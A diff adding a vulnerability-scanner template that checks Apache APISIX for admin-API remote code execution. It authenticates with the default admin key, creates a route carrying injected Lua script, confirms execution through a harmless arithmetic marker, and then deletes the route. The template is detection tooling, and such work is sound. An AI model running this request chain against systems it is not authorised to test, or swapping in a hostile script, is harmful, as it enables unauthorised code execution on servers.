@@ -1,0 +1,84 @@
+id: apisix-admin-rce
+info:
+  name: Apache APISIX Admin Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, apache, apisix
+
+variables:
+  r_rand_str: "{{rand_base(8)}}"
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: check-admin-access
+    method: GET
+    path:
+      - "{{BaseURL}}/apisix/admin/routes"
+    headers:
+      X-API-KEY: "edd1c9f034335f136f87ad84b625c8f1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"action\":\"get"
+        part: body
+
+  - id: create-malicious-route
+    method: POST
+    path:
+      - "{{BaseURL}}/apisix/admin/routes"
+    headers:
+      X-API-KEY: "edd1c9f034335f136f87ad84b625c8f1"
+      Content-Type: "application/json"
+    body: |
+      {
+          "uri": "/{{r_rand_str}}",
+          "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n ngx.say(123*456*789)  \n end \nreturn _M",
+          "upstream": {
+              "type": "roundrobin",
+              "nodes": {
+                  "example.com:80": 1
+              }
+          }
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+      - type: word
+        words:
+          - "uri\": \"/{{r_rand_str}}\""
+        part: body
+
+  - id: trigger-malicious-route
+    method: GET
+    path:
+      - "{{BaseURL}}/{{r_rand_str}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "44253432"
+        part: body
+
+  - id: delete-malicious-route
+    method: DELETE
+    path:
+      - "{{BaseURL}}/apisix/admin/routes/{{r_rand_str}}"
+    headers:
+      X-API-KEY: "edd1c9f034335f136f87ad84b625c8f1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"deleted\":\"1\""
+        part: body
